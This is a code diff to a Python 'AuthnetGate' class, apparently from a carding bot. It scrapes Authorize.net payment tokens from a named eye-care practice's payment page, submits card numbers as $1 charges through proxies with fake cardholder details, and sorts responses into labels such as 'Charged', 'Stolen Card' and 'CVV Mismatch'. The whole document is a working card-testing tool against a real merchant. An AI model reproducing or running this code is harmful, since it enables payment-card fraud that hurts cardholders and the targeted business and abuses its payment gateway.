@@ -12,39 +12,45 @@ from BOT.tools.proxy import get_proxy
 
 user_locks = {}
 
+# URLs from original API
+BASE_URL = 'https://hudsonrivereyecare.com'
+AJAX_URL = f'{BASE_URL}/wp-admin/admin-ajax.php'
+AUTH_NET_URL = 'https://secure.authorize.net/gateway/transact.dll'
+
+# Headers from original API
+HEADERS_AJAX = {
+    'Accept': '*/*',
+    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Pragma': 'no-cache',
+    'Referer': f'{BASE_URL}/make-a-payment/',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+    'X-Requested-With': 'XMLHttpRequest',
+    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+}
+
+HEADERS_POST = {
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+}
+
 
 class AuthnetGate:
-    """Authorize.net $1 Charge Gate - Real Checking"""
+    """Authorize.net $1 Charge Gate - Real Checking (Original API)"""
     
     def __init__(self, proxy=None):
         self.s = requests.Session()
         self.proxy = proxy
-        
-        self.headers_ajax = {
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive',
-            'Pragma': 'no-cache',
-            'Referer': 'https://hudsonrivereyecare.com/make-a-payment/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-            'X-Requested-With': 'XMLHttpRequest',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-        }
-        
-        self.headers_post = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        }
         
         # Apply proxy if provided
         if proxy:
@@ -53,20 +59,14 @@ class AuthnetGate:
             self.proxies = None
     
     def check_card(self, cc, mm, yy, cvv):
-        """Full Authnet $1 charge check"""
+        """Full Authnet $1 charge check - Original API"""
         try:
-            # Format expiration date for Authnet (MMYY)
-            if int(mm) < 10 and len(mm) == 1:
-                mm = f'0{mm}'
+            # Format expiration date for Authnet (MMYY) - exact as original
+            exp_month_full = mm.zfill(2)
+            exp_year_short = yy[-2:] if len(yy) >= 2 else yy
+            exp_date_authnet = exp_month_full + exp_year_short
             
-            if len(yy) == 4:
-                yy_short = yy[-2:]
-            else:
-                yy_short = yy
-            
-            exp_date_authnet = mm + yy_short
-            
-            # Step 1: Get tokens from AJAX endpoint
+            # Step 1: Get tokens from AJAX endpoint - exact as original
             params_ajax = {
                 'custom_amount': '1.00',
                 'invoice_ajax': '',
@@ -75,28 +75,30 @@ class AuthnetGate:
             }
             
             x = self.s.get(
-                'https://hudsonrivereyecare.com/wp-admin/admin-ajax.php',
+                AJAX_URL,
                 params=params_ajax,
-                headers=self.headers_ajax,
+                cookies=self.s.cookies,
+                headers=HEADERS_AJAX,
                 proxies=self.proxies,
-                timeout=30
+                timeout=15
             )
+            x.raise_for_status()
             
-            # Extract required tokens
+            # Extract tokens - exact regex as original
             login_match = re.search(r"name='x_login'\s+value='([^']*)'", x.text)
             hash_match = re.search(r"name='x_fp_hash'\s+value='([^']*)'", x.text)
             sequence_match = re.search(r"name='x_fp_sequence'\s+value='([^']*)'", x.text)
             time_match = re.search(r"name='x_fp_timestamp'\s+value='([^']*)'", x.text)
             
             if not all([login_match, hash_match, sequence_match, time_match]):
-                return "Declined ❌", "Failed to get tokens"
+                return "Declined ❌", "Token Error"
             
             login = login_match.group(1)
             hash_val = hash_match.group(1)
             sequence = sequence_match.group(1)
             time_val = time_match.group(1)
             
-            # Step 2: Submit to Authorize.net gateway
+            # Step 2: Submit to Authorize.net gateway - exact data as original
             data = [
                 ('x_show_form', 'pf_receipt'),
                 ('x_show_form', 'pf_receipt'),
@@ -106,31 +108,31 @@ class AuthnetGate:
                 ('x_fp_timestamp', time_val),
                 ('x_fp_sequence', sequence),
                 ('x_version', '3.1'),
-                ('x_description', 'Payment'),
+                ('x_description', 'We are happy to provide convenient and secure online payments for our clients.'),
                 ('x_test_request', 'false'),
                 ('x_method', 'cc'),
-                ('x_header_html_payment_form', '<h1>Payment</h1>'),
+                ('x_header_html_payment_form', '<h1>Tarrytown and White Plains offices</h1>'),
                 ('x_logo_url', 'https://hudsonrivereyecare.com/wp-content/uploads/2017/04/optometrist-in-tarrytown-white-plains-ny-hudson-river.jpg'),
-                ('x_receipt_link_method', 'https://hudsonrivereyecare.com'),
+                ('x_receipt_link_method', 'https://hudsonrivereyecare.com/wp-content/uploads/2017/04/optometrist-in-tarrytown-white-plains-ny-hudson-river.jpg'),
                 ('x_header_html_receipt', 'THANK YOU FOR MAKING A PAYMENT'),
                 ('x_invoice_num', 'Invoice Number'),
                 ('x_card_num', cc),
                 ('x_exp_date', exp_date_authnet),
-                ('x_first_name', 'John'),
-                ('x_last_name', 'Smith'),
+                ('x_first_name', 'cash'),
+                ('x_last_name', 'xpro'),
                 ('x_company', 'Test Company'),
-                ('x_address', '123 Main St'),
+                ('x_address', '123 street St'),
                 ('x_city', 'New York'),
                 ('x_state', 'NY'),
                 ('x_zip', '10001'),
                 ('x_country', 'United States'),
-                ('x_email', f'user{random.randint(1000,9999)}@gmail.com'),
+                ('x_email', 'cashxpro@gmail.com'),
                 ('x_phone', '5551234567'),
                 ('x_fax', '5551234568'),
-                ('x_ship_to_first_name', 'John'),
-                ('x_ship_to_last_name', 'Smith'),
-                ('x_ship_to_company', 'Test Company'),
-                ('x_ship_to_address', '123 Main St'),
+                ('x_ship_to_first_name', 'cash'),
+                ('x_ship_to_last_name', 'xpro'),
+                ('x_ship_to_company', 'Street Company'),
+                ('x_ship_to_address', '123 street St'),
                 ('x_ship_to_city', 'New York'),
                 ('x_ship_to_state', 'NY'),
                 ('x_ship_to_zip', '10001'),
@@ -138,31 +140,28 @@ class AuthnetGate:
             ]
             
             res = self.s.post(
-                'https://secure.authorize.net/gateway/transact.dll',
-                headers=self.headers_post,
+                AUTH_NET_URL,
+                headers=HEADERS_POST,
                 data=data,
                 proxies=self.proxies,
-                timeout=30
+                timeout=15
             )
+            res.raise_for_status()
             
-            # Parse response
+            # Parse response - exact as original
             soup = BeautifulSoup(res.text, 'html.parser')
             error_h2 = soup.find('h2', {'role': 'alert'})
             
             if error_h2:
                 error_message = error_h2.text.strip()
                 
+                # If no error, it's Live
+                if not error_message or "approved" in error_message.lower():
+                    return "Charged 💎", "Charged $1"
+                
                 # Parse error codes
                 error_lower = error_message.lower()
-                if "approved" in error_lower:
-                    return "Charged 💎", "Charged $1"
-                elif "declined" in error_lower:
-                    return "Declined ❌", error_message[:40]
-                elif "invalid card" in error_lower:
-                    return "Declined ❌", "Invalid Card"
-                elif "expired" in error_lower:
-                    return "Declined ❌", "Card Expired"
-                elif "insufficient" in error_lower:
+                if "insufficient" in error_lower:
                     return "Approved ✅", "Insufficient Funds"
                 elif "do not honor" in error_lower:
                     return "Approved ✅", "Do Not Honor"
@@ -174,20 +173,22 @@ class AuthnetGate:
                     return "Approved ✅", "Stolen Card"
                 elif "cvv" in error_lower or "cvc" in error_lower or "security code" in error_lower:
                     return "CCN ✅", "CVV Mismatch"
-                elif "avs" in error_lower or "address" in error_lower:
-                    return "Approved ✅", "AVS Mismatch"
+                elif "expired" in error_lower:
+                    return "Declined ❌", "Expired Card"
+                elif "invalid" in error_lower:
+                    return "Declined ❌", "Invalid Card"
                 else:
                     return "Declined ❌", error_message[:40]
             else:
-                # Check if transaction was approved
-                if "thank you" in res.text.lower() or "approved" in res.text.lower():
-                    return "Charged 💎", "Charged $1"
-                return "Declined ❌", "Unknown Response"
+                # No error = Live (as per original: "else: return f"{full_info} >> Live")
+                return "Charged 💎", "Charged $1"
                 
         except requests.exceptions.Timeout:
             return "Declined ❌", "Timeout"
         except requests.exceptions.ProxyError:
             return "Declined ❌", "Proxy Error"
+        except requests.exceptions.RequestException:
+            return "Declined ❌", "Request Error"
         except Exception as e:
             return "Declined ❌", str(e)[:40]
 
